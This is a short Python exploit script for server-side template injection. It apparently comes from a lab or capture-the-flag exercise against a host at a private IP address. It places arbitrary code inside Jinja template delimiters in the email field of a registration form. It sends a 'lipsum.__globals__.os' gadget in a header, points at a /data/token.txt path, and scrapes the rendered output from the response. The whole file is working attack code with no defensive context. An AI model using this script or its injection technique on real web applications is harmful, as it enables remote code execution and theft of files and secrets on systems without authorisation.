#!/usr/bin/env python3
import requests
from urllib.parse import quote_plus
from bs4 import BeautifulSoup
from argparse import ArgumentParser


class SSTI():
	def __init__(self, url, debug, setvar):
		self.url = url
		self.debug = debug
		self.count = 0
		self.set = setvar

	def register(self, code, pw='a'):
		if self.set:
			user = '{%' + quote_plus(code) + '%}@b.co'
		else:
			user = '{{' + quote_plus(code) + '}}@b.co'
		if self.debug:
			print(user)

		pw = quote_plus(pw)
		headers = {
			'Accept-Encoding': 'gzip, deflate',
			'Content-Type': 'application/x-www-form-urlencoded',
			'session': 'lipsum.__globals__.os'

		}
		data = {
			'email': user,
			'password': pw,
			'confirm': pw
		}

		if self.debug > 1:
			print('Headers: {}'.format(headers))
			print('Data: {}'.format(data))

		r = requests.post(self.url, headers=headers, data=data)
		if r.status_code != 200:
			return r.status_code, r.reason
		if self.debug > 1:
			print(r.headers)

		soup = BeautifulSoup(r.text, features='lxml')

		if self.debug > 2:
			print(soup.prettify())

		template = soup.select_one('p.help-block')

		if template:
			return template.text
		elif self.count > 1:
			return 'No result for {}'.format(user)
		else:
			self.count += 1
			return self.register(code, pw)


def get_args():
	parser = ArgumentParser()
	parser.add_argument('code', help='Code to inject')
	parser.add_argument('-v', action='count', default=0, help='Verbosity')
	parser.add_argument('-s', '--set', action='store_true',
						help='Set a variable')
	return parser.parse_args()


if __name__ == '__main__':
	args = get_args()
	temp = SSTI('http://10.102.1.119/user/register?o=/data/token.txt', debug=args.v,
				setvar=args.set)
	print(temp.register(args.code))
